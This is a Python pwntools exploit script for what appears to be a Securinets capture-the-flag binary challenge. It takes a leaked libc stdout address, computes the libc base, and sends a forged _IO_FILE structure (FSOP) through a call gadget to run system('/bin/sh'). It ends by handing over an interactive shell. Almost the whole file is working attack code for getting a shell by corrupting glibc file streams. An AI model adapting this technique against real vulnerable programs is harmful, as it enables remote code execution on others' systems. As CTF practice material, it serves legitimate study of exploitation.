from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './main'
HOST = 'pwn-14caf623.p1.securinets.tn'
PORT =  9002

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints, bplib):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    for bp in bplib:
        script += "b *0x%x\n"%(base+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

r.recvuntil(b' : ')
leak = int(r.recvuntil(b'\n', True), 16)
print(f'{leak = :#x}')
base = leak -0x1e85c0
print(f'{base = :#x}')

stdout = leak
stdout_lock = base + 0x1e97b0
binsh = base + 0x1a7ea4
dosystem = base + 0x52c92
gadget = base + 0x00091755#: mov rdi, [rbx+8]; call qword ptr [rbx];

fsop = b''
fsop += flat(0x00, 2)              # 0x00: _flags, _IO_read_ptr
fsop += flat(3, 4)              # 0x10: _IO_read_end, _IO_read_base
fsop += flat(1, 2)              # 0x20: _IO_write_base, _IO_write_ptr
fsop += flat(1, dosystem)              # 0x30: _IO_write_end, _IO_buf_base
fsop += flat(binsh, 0)             # 0x40: _IO_buf_end, _IO_save_base
fsop += flat(0x111111111111, 0x222222222222)            # 0x50: _IO_backup_base, _IO_save_end
fsop += flat(0x333333333333, 0)            # 0x60: _makers, _chain
fsop += flat(stdout+0x58, 0x444444444444)  # 0x70: _fileno, _flags2, _old_offset
fsop += flat(gadget, stdout_lock) # 0x80: _cur_column, _vtable_offset, _shortbuf, _lock
fsop += flat(0x555555555555, stdout+0x70-0x38)            # 0x90: _offset, _codecvt
fsop += flat(stdout+0x10, 0)            # 0xa0: _wide_data, _freeres_list
fsop += flat(stdout+0xb8, 0x666666666666)            # 0xb0: _freeres_buf, ___pad5
fsop += p32(0x1)+p32(0)+p64(0x777777777777)  # 0xc0: _mode, _unused2
fsop += flat(0x888888888888, 0)            # 0xd0: _unused2, vtable

if args.D:
    #debug(r, [], [0x8d47b])
    #debug(r, [], [0x8d350,0x8d401])
    debug(r, [], [0x86127])
    #debug(r, [], [0x8ad35, 0x8db08])

r.send(fsop[:0xd8])

r.interactive()
r.close()
